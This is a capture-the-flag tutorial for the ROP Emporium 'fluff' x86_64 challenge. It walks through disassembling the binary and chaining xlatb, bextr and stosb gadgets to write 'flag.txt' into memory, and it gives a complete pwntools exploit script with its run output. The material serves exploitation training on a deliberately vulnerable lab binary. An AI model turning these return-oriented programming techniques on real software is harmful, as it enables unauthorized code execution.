---
Title: Ropemporium x86_64 fluff
Date: 2023-06-06
Tags: [linux, pwn, python, ROP, x86_64, ropemporium]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# fluff

## Consigne
Working backwards

Once we've employed our usual drills of checking protections and searching for interesting symbols & strings, we can think about what we're trying to acheive and plan our chain. A solid approach is to work backwards: we'll need a write gadget - for example mov [reg], reg or something equivalent - to make the actual write, so we can start there.
Do it!

There's not much more to this challenge, we just have to think about ways to move data into the registers we want to control. Sometimes we'll need to take an indirect approach, especially in smaller binaries with fewer available gadgets like this one. If you're using a gadget finder like ropper, you may need to tell it to search for longer gadgets. As usual, you'll need to call the print_file() function with a path to the flag as its only argument. Some useful(?) gadgets are available at the questionableGadgets symbol.

## Discovery

### Execution

```sh
06_fluff# ./fluff
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> OK
Thank you!
```

### Protections

```
06_fluff# checksec fluff
[*] '/w/ropemporium/x64/06_fluff/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

## The code

The main function calls pwnme as imported function:

```sh
[0x00400628]>  pdf @ sym.main
┌ 16: int main (int argc, char **argv, char **envp);
│           0x00400607      55             push rbp
│           0x00400608      4889e5         mov rbp, rsp
│           0x0040060b      e8f0feffff     call sym.imp.pwnme
│           0x00400610      b800000000     mov eax, 0
│           0x00400615      5d             pop rbp
└           0x00400616      c3             ret
```

Take a look at pwnme:
```sh
┌ 153: sym.pwnme ();
│           ; var void *buf @ rbp-0x20
│           0x000008aa      55             push rbp
│           0x000008ab      4889e5         mov rbp, rsp
│           0x000008ae      4883ec20       sub rsp, 0x20
│           0x000008b2      488b05270720.  mov rax, qword [reloc.stdout] ; [0x200fe0:8]=0
│           0x000008b9      488b00         mov rax, qword [rax]
│           0x000008bc      b900000000     mov ecx, 0                  ; size_t size
│           0x000008c1      ba02000000     mov edx, 2                  ; int mode
│           0x000008c6      be00000000     mov esi, 0                  ; char *buf
│           0x000008cb      4889c7         mov rdi, rax                ; FILE*stream
│           0x000008ce      e8bdfeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x000008d3      488d3d060100.  lea rdi, str.fluff_by_ROP_Emporium ; sym..rodata
│                                                                      ; 0x9e0 ; "fluff by ROP Emporium" ; const char *s
│           0x000008da      e851feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000008df      488d3d100100.  lea rdi, str.x86_64_n       ; 0x9f6 ; "x86_64\n" ; const char *s
│           0x000008e6      e845feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000008eb      488d45e0       lea rax, [buf]
│           0x000008ef      ba20000000     mov edx, 0x20               ; "@" ; size_t n
│           0x000008f4      be00000000     mov esi, 0                  ; int c
│           0x000008f9      4889c7         mov rdi, rax                ; void *s
│           0x000008fc      e85ffeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x00000901      488d3df80000.  lea rdi, str.You_know_changing_these_strings_means_I_have_to_rewrite_my_solutions...
│           0x00000908      e823feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0000090d      488d3d340100.  lea rdi, [0x00000a48]       ; "> "
│           0x00000914      b800000000     mov eax, 0
│           0x00000919      e832feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0000091e      488d45e0       lea rax, [buf]
│           0x00000922      ba00020000     mov edx, 0x200              ; size_t nbyte
│           0x00000927      4889c6         mov rsi, rax                ; void *buf
│           0x0000092a      bf00000000     mov edi, 0                  ; int fildes
│           0x0000092f      e83cfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00000934      488d3d100100.  lea rdi, str.Thank_you_     ; 0xa4b ; "Thank you!" ; const char *s
│           0x0000093b      e8f0fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00000940      90             nop
│           0x00000941      c9             leave
└           0x00000942      c3             ret
```

The situation is like callme.

But we can't find a `mov [reg], reg`.

    ROPgadget --binary fluff --depth 15 | grep mov
    Nothing with [rxx]


The introduction suggest us to look at questionableGadgets symbol:

```sh
[0x00400628]> pd 10 @ loc.questionableGadgets
            ;-- questionableGadgets:
            0x00400628      d7             xlatb
            0x00400629      c3             ret
            0x0040062a      5a             pop rdx
            0x0040062b      59             pop rcx
            0x0040062c      4881c1f23e00.  add rcx, 0x3ef2
            0x00400633      c4e2e8f7d9     bextr rbx, rcx, rdx
            0x00400638      c3             ret
            0x00400639      aa             stosb byte [rdi], al
            0x0040063a      c3             ret
            0x0040063b      0f1f440000     nop dword [rax + rax]
```
Ok, we have 3 gadgets.

* with `stosb byte [rdi], al` we can write one byte in memory if we control al and rdi.

Control rdi :
```
06_fluff# ROPgadget --binary fluff --depth 15 |grep "pop rdi"
0x00000000004006a3 : pop rdi ; ret
```
By usage 8 time of this gadeget we can write out "flag.txt".

To do that we need to control edi an al

For edi we found a `pop rdi` gadget

     0x4006a3 : pop rdi ; ret

But no "pop rax".

* The gadget `xlatb` : allows us to control al from rbx and current value of al.

    *XLATB : Table Look-up Translation Byte : Set AL to the contents of DS:[RBX + unsigned AL].*

`al` is loaded with le byte content of the address given by rbx+al.


What about the value of `al` at the end of `pwnme`?

```
   0x00007fef49e00934 <+138>:	lea    rdi,[rip+0x110]        # 0x7fef49e00a4b
   0x00007fef49e0093b <+145>:	call   0x7fef49e00730 <puts@plt>
=> 0x00007fef49e00940 <+150>:	nop
   0x00007fef49e00941 <+151>:	leave
   0x00007fef49e00942 <+152>:	ret
```

At this moment rax contains the return code of puts, the length of "Thank you!", 11.

To set `al` to the value x we can call `xlatb` with `rbx` pointing "an address which contains x" - 11,
for the first round.

After that, `al` takes the value of the last written character.

But now we need to control `rbx`.


* The third gadget use `bextr` : allows us to update rbx if we control rcx and rdx contents.

    *BEXTR rdest, rsrc, rctrl Contiguous bitwise extract from r/m64 using rctrl as control; store result in r64a.
rctrl set de start index and the length of the extraction from rsrc to rdest whith its two half parts.
index(32)|size(32)*

(https://www.felixcloutier.com/x86/bextr)

Our gadget do that :
- load rdx  and rcx
- add 0x3ef2 to rcx
- bextr rbx, rcx, rdx

Then to load rcx with an X value we can
- set edx to 64 (index=0, size=64)
- set ecx to X-0x3ef2
- apply the gadget

*** Fun test ***

To test and observe bextr

```nasm
;  nasm -felf64 bextr.asm && ld -o bextr bextr.o
          global    _start
          extern    printf

          section   .text

_start:   mov       rcx, 0x4847464544434241
          mov       rdx, 0x0000000000001008 ; 16:08
          bextr     rbx, rcx, rdx
          ; end of useful code; below it's only write stdout
          mov       rdi, buffer             ; save rbx to buffer
          mov       [rdi], ebx              ;
          mov       rax, 1                  ; sys_write
          mov       rsi, rdi                ; buffer
          mov       rdi, 1                  ; stdout
          mov       rdx, 17                 ; size
          syscall                           ;
          mov       rax, 60                 ; system call for exit
          xor       rdi, rdi                ; exit code 0
          syscall                           ; invoke operating system to exit

          section   .data
buffer:   db        "               "       ; init white message (uggly)
          db        10      ; LF

```

This little program extract 8 bits for bit 16 of "ABCDEFGH".

        06_fluff$ ./bextr
        BC

Follow it in gdb


*** end of fun test ***




With those 3 gadgets we can write successively each character of our string.

We have to find an address of a byte containing each one of them.
For that we can use radare2 and for example to find a 'f':

        [0x00400520]> / f
        Searching 1 byte in [0x601038-0x601040]
        hits: 0
        Searching 1 byte in [0x600df0-0x601038]
        hits: 0
        Searching 1 byte in [0x400000-0x400838]
        hits: 10
        Searching 1 byte in [0x100000-0x1f0000]
        hits: 0
        0x004003c4 hit1_0 .libfluff.so__gmon_s.
        0x004003c7 hit1_1 .libfluff.so__gmon_star.
        0x004003c8 hit1_2 .libfluff.so__gmon_start.
        0x004003e2 hit1_3 .n_start__print_filepwnme_init.
        0x004003f4 hit1_4 .lepwnme_init_finilibc.so.6__.
        0x00400552 hit1_5 .@ Df.@U8.
        0x0040058a hit1_6 .]8`D]fD8`UH8.
        0x004005ca hit1_7 .t]8`]fD=a uUH.
        0x004005f6 hit1_8 . ]D@f.UH].
        0x004006a6 hit1_9 .H[]A\A]A^A_f.H.

Result for flag.txt :

        0x4003c4 f
        0x4003c5 l
        0x4005d2 a
        0x4003cf g
        0x400436 .
        0x400437 t
        0x400246 x
        0x400437 t

To control `rbx` we can find this gadget:

    0x000000000040069a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

or the bextr gadget.

The first is simple but will use 6 pop, 7 entries on the ropchaine

The second more complexe but use 3 entires.

We have to do that 8 times.

## Building a ropchain

1. Set rbx to the letter addres-11
2. Load al
3. Load rdi to the target
4. Write al to rdi

We have 0x200 bytes for the ropchain

``` sh
│           0x00000922      ba00020000     mov edx, 0x200              ; size_t nbyte
│           0x00000927      4889c6         mov rsi, rax                ; void *buf
│           0x0000092a      bf00000000     mov edi, 0                  ; int fildes
│           0x0000092f      e83cfeffff     call sym.imp.read           ;
```

Two ways for set `rbx`:

The first:
```
set_rbx(addr_letter, cur_al_value) :
    pop_rbx6
    addr_letter - cur_al_value
    deadbeef * 5
```
⇒ Use  7 words

The second:
```
set_rbx(addr_letter, cur_al_value):
    bextr_gadget
    64
    addr_letter-0x3ef2 - cur_al_value
```
⇒ Use 3 words

To load al:
```
load_al(addr_letter) :
    set_rbx(addr_letter)
    xlatb
```
⇒ Use 2 words

And to write it:
```
write_al_to_addr(address)
    pop rdi
    address
    g_stosb
⇒ Use 3 words
```

Finally we have to do this for each letter's addr, and each al value:

``` sh
    load_al(letter_addr, al)
    write_al_to_addr(target)
    target++
```

The first way use `8*12` words (0x300)
The second way use `8*8` words (0x200) yes !

See it in the python script bellow.

``` python
# Build a ropchain to set
# al =  (byte) addr[al]
def load_al_from_addr(addr, al):
    r=p64(g_bextr)
    r+=p64(64<<8)
    r+=p64(addr-0x3ef2-al)
    r+=p64(g_xlatb)
    return r

# Build a ropchain to write al in [addr]
def write_al_to_addr(addr):
    r=p64(g_pop_rdi)
    r+=p64(addr)
    r+=p64(g_stosb)
    return r
```

And then we can loop for each character and call these functions to build the complete ropchain.

``` python
# List of addresses containing f,l,a,g,.,t,x,t
flag_txt = [0x4003c4, 0x4003c5, 0x4005d2, 0x4003cf, 0x400436,  0x4006cb, 0x4006c8, 0x4006cb]
# List of the successives values of al: 0xb,0x66,0x6c ...
lst_al = b"\x0bflag.txt"

PL =b"A"*offset
for i, letter_addr in enumerate(flag_txt):
    PL += load_al_from_addr(letter_addr,lst_al[i])
    PL += write_al_to_addr(bss+i)
```

After that, to finalize:

``` python
PL+=p64(g_pop_rdi)
PL+=p64(bss)
PL+=p64(print_file)
```

## Python script

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# break apres le read dans pwnme
gs='''
b *pwnme+150
c
'''

# Gadgets
# xlatb; ret
g_xlatb=0x00400628
# pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
g_bextr = 0x0040062a
# stosb byte [rdi], al; ret
g_stosb = 0x00400639
# pop rdi ; ret
g_pop_rdi = 0x4006a3


def load_al_from_addr(addr, al):
    r=p64(g_bextr)
    r+=p64(64<<8)
    r+=p64(addr-0x3ef2-al)
    r+=p64(g_xlatb)
    return r

def write_al_to_addr(addr):
    r=p64(g_pop_rdi)
    r+=p64(addr)
    r+=p64(g_stosb)
    return r


# Offset avant ecrasement de l'adresse de retour
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('fluff')
context.binary=elf

print_file=elf.plt['print_file']

bss = 0x00601038

flag_txt = [0x4003c4, 0x4003c5, 0x4005d2, 0x4003cf, 0x400436,  0x4006cb, 0x4006c8, 0x4006cb]
lst_al = b"\x0bflag.txt"

PL =b"A"*offset
for i, letter_addr in enumerate(flag_txt):
    PL += load_al_from_addr(letter_addr,lst_al[i])
    PL += write_al_to_addr(bss+i)

PL+=p64(g_pop_rdi)
PL+=p64(bss)
PL+=p64(print_file)

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)

# io.recvuntil(b"> ")
io.sendline(PL)
io.interactive()
```

## Execution

``` sh
[*] '/home/jce/w/ropemporium/x64/06_fluff/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/jce/w/ropemporium/x64/06_fluff/fluff': pid 22079
[*] Switching to interactive mode
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

